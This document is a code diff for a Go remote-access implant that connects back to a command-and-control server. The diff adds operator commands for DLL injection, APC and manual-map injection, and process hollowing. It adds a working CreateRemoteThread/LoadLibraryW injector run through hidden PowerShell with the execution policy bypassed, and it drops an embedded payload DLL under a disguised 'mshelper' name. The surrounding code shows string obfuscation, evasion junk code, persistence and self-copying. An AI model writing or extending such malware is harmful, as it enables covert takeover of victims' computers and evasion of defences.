@@ -88,6 +88,14 @@ var (
 	c2LocalTestMode bool
 )
 
+// BuildMode is set at link time: ""/"exe" for normal EXE, "dll" for -buildmode=c-shared.
+// Example: -ldflags "-X main.BuildMode=dll"
+var BuildMode = "exe"
+
+func isDLLMode() bool {
+	return strings.EqualFold(BuildMode, "dll")
+}
+
 // Fixed shift for consistency
 const shiftValue = 5
 
@@ -95,17 +103,21 @@ const shiftValue = 5
 const xorKey = "g0r4ng0r3v4d3r"
 
 func shiftEncrypt(text string) string {
-	result := make([]byte, len(text))
-	for i, char := range text {
-		result[i] = byte((int(char) + shiftValue) % 256)
+	in := []byte(text)
+	result := make([]byte, len(in))
+	for i := 0; i < len(in); i++ {
+		result[i] = byte((int(in[i]) + shiftValue) % 256)
 	}
 	return string(result)
 }
 
 func shiftDecrypt(text string) string {
-	result := make([]byte, len(text))
-	for i, char := range text {
-		result[i] = byte((int(char) - shiftValue + 256) % 256)
+	// Must iterate bytes — not range (runes). High shiftValues produce bytes >= 128;
+	// ranging those as UTF-8 replaces them with RuneError and corrupts API names.
+	in := []byte(text)
+	result := make([]byte, len(in))
+	for i := 0; i < len(in); i++ {
+		result[i] = byte((int(in[i]) - shiftValue + 256) % 256)
 	}
 	return string(result)
 }
@@ -1992,6 +2004,55 @@ func handleCmd(command string, conn net.Conn) {
 		return
 	}
 
+	// Injection / migrate — plaintext first so polymorphic XOR never breaks these
+	if strings.HasPrefix(cmdLower, "injectdll ") || strings.HasPrefix(cmdLower, "migrate ") {
+		parts := strings.Fields(command)
+		if len(parts) < 2 {
+			sendData(conn, Resp{Type: "response", Content: "Usage:\n  migrate <pid>              — drop embedded DLL into that process (real inject)\n  injectdll <pid> <dll_path> — LoadLibrary a .dll into that process"})
+			return
+		}
+		pid := parts[1]
+		dllPath := ""
+		if strings.HasPrefix(cmdLower, "migrate ") {
+			// empty path => materialize embedded DLL then LoadLibrary into pid
+			dllPath = ""
+		} else if len(parts) >= 3 {
+			dllPath = strings.Join(parts[2:], " ")
+		} else {
+			sendData(conn, Resp{Type: "response", Content: "Usage: injectdll <pid> <path_to.dll>"})
+			return
+		}
+		sendData(conn, Resp{Type: "response", Content: injectDLL(pid, dllPath)})
+		return
+	}
+	if strings.HasPrefix(cmdLower, "injectapc ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			sendData(conn, Resp{Type: "response", Content: "Usage: injectapc <pid> <dll_path>"})
+			return
+		}
+		sendData(conn, Resp{Type: "response", Content: injectAPCDLL(parts[1], strings.Join(parts[2:], " "))})
+		return
+	}
+	if strings.HasPrefix(cmdLower, "injectmanual ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			sendData(conn, Resp{Type: "response", Content: "Usage: injectmanual <pid> <dll_path>"})
+			return
+		}
+		sendData(conn, Resp{Type: "response", Content: injectManualDLL(parts[1], strings.Join(parts[2:], " "))})
+		return
+	}
+	if strings.HasPrefix(cmdLower, "hollowprocess ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			sendData(conn, Resp{Type: "response", Content: "Usage: hollowprocess <target_exe> <payload_exe>"})
+			return
+		}
+		sendData(conn, Resp{Type: "response", Content: hollowProcess(parts[1], strings.Join(parts[2:], " "))})
+		return
+	}
+
 	testStr := deobfuscateString(obfTest)
 	debugStr := deobfuscateString(obfDebug)
 	uploadStr := deobfuscateString(obfUpload)
@@ -2247,111 +2308,120 @@ func handleCmd(command string, conn net.Conn) {
 
 // ============= DLL INJECTION FUNCTIONS =============
 
-// Classic DLL injection using CreateRemoteThread + LoadLibrary
+// injectDLL LoadLibrary-injects a .dll into the target PID so OUR CODE runs
+// inside that process. Session lives/dies with the host PID — not a new EXE.
 func injectDLL(pidStr, dllPath string) string {
 	if runtime.GOOS != "windows" {
-		return "DLL injection only supported on Windows"
+		return "Injection only supported on Windows"
 	}
-	
+
 	pid, err := strconv.Atoi(pidStr)
 	if err != nil {
 		return fmt.Sprintf("Invalid PID: %s", pidStr)
 	}
 
-	// Check if DLL exists
-	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
-		return fmt.Sprintf("DLL not found: %s", dllPath)
+	dllPath = strings.TrimSpace(dllPath)
+	if dllPath == "" {
+		// migrate-style: drop embedded DLL then inject
+		p, err := materializeEmbeddedDLL()
+		if err != nil {
+			return err.Error()
+		}
+		dllPath = p
 	}
 
-	// Get full path
+	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
+		return fmt.Sprintf("File not found: %s", dllPath)
+	}
+
 	fullPath, err := filepath.Abs(dllPath)
 	if err != nil {
 		return fmt.Sprintf("Failed to get absolute path: %v", err)
 	}
 
-	result := fmt.Sprintf("Injecting %s into PID %d...\n", fullPath, pid)
-	
-	// Use PowerShell for the injection to avoid direct WinAPI calls
+	ext := strings.ToLower(filepath.Ext(fullPath))
+	if ext != ".dll" {
+		return "Real injection requires a .dll (not .exe).\n" +
+			"Generate a Windows build from the dashboard (embeds inject DLL), then run:\n" +
+			"  migrate <pid>\n" +
+			"or:\n" +
+			"  injectdll <pid> C:\\path\\to\\implant.dll\n" +
+			"An .exe cannot be LoadLibrary'd into another process."
+	}
+	return injectDllViaLoadLibrary(pid, fullPath)
+}
+
+// materializeEmbeddedDLL writes the build-embedded payload DLL to TEMP.
+func materializeEmbeddedDLL() (string, error) {
+	if len(embeddedInjectDLL) < 64 {
+		return "", fmt.Errorf("This EXE has no embedded inject DLL. Generate a fresh Windows build from the dashboard (DLL inject pack).")
+	}
+	// MZ check
+	if embeddedInjectDLL[0] != 'M' || embeddedInjectDLL[1] != 'Z' {
+		return "", fmt.Errorf("Embedded inject DLL is corrupt")
+	}
+	name := fmt.Sprintf("mshelper_%d.dll", time.Now().UnixNano()%1e8)
+	dst := filepath.Join(os.TempDir(), name)
+	if err := os.WriteFile(dst, embeddedInjectDLL, 0644); err != nil {
+		return "", fmt.Errorf("Failed to drop inject DLL: %v", err)
+	}
+	return dst, nil
+}
+
+func injectDllViaLoadLibrary(pid int, fullPath string) string {
+	escaped := strings.ReplaceAll(fullPath, `\`, `\\`)
+	escaped = strings.ReplaceAll(escaped, `"`, `\"`)
 	psScript := fmt.Sprintf(`
 $code = @'
 using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
-
-public class Injector {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
-
-    public static string Inject(int pid, string dllPath) {
-        try {
-            IntPtr hProcess = OpenProcess(0x1F0FFF, false, (uint)pid);
-            if (hProcess == IntPtr.Zero) return "Failed to open process";
-            
-            IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(dllPath.Length + 1), 0x3000, 0x40);
-            if (allocMem == IntPtr.Zero) {
-                CloseHandle(hProcess);
-                return "Failed to allocate memory";
-            }
-            
-            byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath);
-            uint bytesWritten;
-            if (!WriteProcessMemory(hProcess, allocMem, dllBytes, (uint)dllBytes.Length, out bytesWritten)) {
-                CloseHandle(hProcess);
-                return "Failed to write memory";
-            }
-            
-            IntPtr kernel32 = GetModuleHandle("kernel32.dll");
-            IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");
-            
-            uint threadId;
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMem, 0, out threadId);
-            
-            CloseHandle(hThread);
-            CloseHandle(hProcess);
-            
-            return hThread != IntPtr.Zero ? "SUCCESS" : "Failed to create remote thread";
-        } catch (Exception ex) {
-            return "ERROR: " + ex.Message;
-        }
-    }
+public class DllInj {
+  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
+  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint n, out uint w);
+  [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
+  [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
+  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr start, IntPtr p, uint f, out uint id);
+  [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+  public static string Run(int pid, string path) {
+    IntPtr hp = OpenProcess(0x1F0FFF, false, (uint)pid);
+    if (hp == IntPtr.Zero) return "Failed to open process (access denied or PID gone)";
+    byte[] bytes = Encoding.Unicode.GetBytes(path + "\0");
+    IntPtr mem = VirtualAllocEx(hp, IntPtr.Zero, (uint)bytes.Length, 0x3000, 0x40);
+    if (mem == IntPtr.Zero) { CloseHandle(hp); return "VirtualAllocEx failed"; }
+    uint w; WriteProcessMemory(hp, mem, bytes, (uint)bytes.Length, out w);
+    IntPtr load = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
+    uint tid; IntPtr th = CreateRemoteThread(hp, IntPtr.Zero, 0, load, mem, 0, out tid);
+    CloseHandle(th); CloseHandle(hp);
+    return th != IntPtr.Zero ? "SUCCESS: DLL injected via LoadLibraryW" : "CreateRemoteThread failed";
+  }
 }
 '@
+Add-Type -TypeDefinition $code -ErrorAction Stop
+[DllInj]::Run(%d, "%s")
+`, pid, escaped)
 
-Add-Type -TypeDefinition $code
-[Injector]::Inject(%d, "%s")
-`, pid, fullPath)
-
-	cmd := exec.Command("powershell", "-Command", psScript)
+	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psScript)
 	setHiddenWindow(cmd)
-	output, err := cmd.Output()
-	
-	if err != nil {
-		result += fmt.Sprintf("PowerShell error: %v", err)
-	} else {
-		result += string(output)
+	out, err := cmd.CombinedOutput()
+	msg := strings.TrimSpace(string(out))
+	if err != nil && msg == "" {
+		return fmt.Sprintf("injectdll failed: %v", err)
 	}
-	
-	return result
+	if msg == "" {
+		return "injectdll: no output"
+	}
+	return fmt.Sprintf(
+		"LoadLibrary inject into PID %d\n%s\n\n"+
+			"This is REAL injection: C2 code now runs INSIDE that process.\n"+
+			"- Kill PID %d  => session dies\n"+
+			"- Kill the original .exe you started  => session should KEEP (host still alive)\n"+
+			"Watch for a NEW session from the host process.",
+		pid, msg, pid,
+	)
 }
+
 
 // APC injection - queues LoadLibrary call via APC
 func injectAPCDLL(pidStr, dllPath string) string {
@@ -2508,63 +2578,72 @@ func handleShell(conn net.Conn) {
 	}
 }
 
+// init starts the C2 loop when loaded as a DLL (LoadLibrary / -buildmode=c-shared).
+// Session then lives inside the HOST process — kill host PID => session dies.
+func init() {
+	if isDLLMode() {
+		go runImplantMain(true)
+	}
+}
+
 func main() {
-	// Runtime junk data for bloating/evasion
-	go addJunkData()
-	junkHeavy() // Additional junk call
+	if isDLLMode() {
+		// c-shared does not call main; if it does, park so process (host) stays up
+		select {}
+	}
+	runImplantMain(false)
+}
 
-	if isAppMode() {
-		if runtime.GOOS == "windows" {
-			hideTerminal()
-			time.Sleep(100 * time.Millisecond)
-		}
+// runImplantMain is shared by EXE and DLL builds.
+// dllMode=true: no single-instance lock, no disk copy, no persistence (stay in host PID).
+func runImplantMain(dllMode bool) {
+	if !dllMode {
+		go addJunkData()
+		junkHeavy()
 
-		if isAppRunning() {
-			os.Exit(0)
-		}
-
-		if !createAppLock() {
-			time.Sleep(1 * time.Second)
+		if isAppMode() {
+			if runtime.GOOS == "windows" {
+				hideTerminal()
+				time.Sleep(100 * time.Millisecond)
+			}
 			if isAppRunning() {
 				os.Exit(0)
 			}
 			if !createAppLock() {
-				os.Exit(0)
+				time.Sleep(1 * time.Second)
+				if isAppRunning() {
+					os.Exit(0)
+				}
+				if !createAppLock() {
+					os.Exit(0)
+				}
 			}
-		}
-
-		exePath, _ := os.Executable()
-		fmt.Println(exePath)
-
-		// Set persistence for app mode after 5 seconds
-		go func() {
-			time.Sleep(5 * time.Second)
-			setPersistence(exePath)
-		}()
-	} else {
-		if runtime.GOOS == "windows" {
-			hideTerminal()
-		}
-
-		go func() {
-			copyPath := makeCopy()
-			fmt.Println(copyPath)
-
-			// Set persistence for copied executable after 10 seconds
-			if copyPath != "" {
-				go func() {
-					time.Sleep(10 * time.Second)
-					setPersistence(copyPath)
-				}()
+			exePath, _ := os.Executable()
+			fmt.Println(exePath)
+			go func() {
+				time.Sleep(5 * time.Second)
+				setPersistence(exePath)
+			}()
+		} else {
+			if runtime.GOOS == "windows" {
+				hideTerminal()
 			}
-		}()
+			go func() {
+				copyPath := makeCopy()
+				fmt.Println(copyPath)
+				if copyPath != "" {
+					go func() {
+						time.Sleep(10 * time.Second)
+						setPersistence(copyPath)
+					}()
+				}
+			}()
+		}
+		initAppMode()
+		setupSignals()
 	}
 
-	initAppMode()
-
 	serverPort := getPort()
-	setupSignals()
-
 	const reconnectDelay = 10 * time.Second
 
 	for {
@@ -2588,19 +2667,7 @@ func main() {
 
 		handleShell(conn)
 		conn.Close()
-
-		// Server restart, network drop, or kill: wait then dial again while process is alive
 		time.Sleep(reconnectDelay)
-		// Junk in loop
 		_ = hashString("loop_junk")
-		// Extra junk
-		for i := 0; i < 5; i++ {
-			_ = i % 13
-		}
-		junk := 0
-		for k := 0; k < 20; k++ {
-			junk += k * (k % 5)
-		}
-		_ = junk
 	}
 }
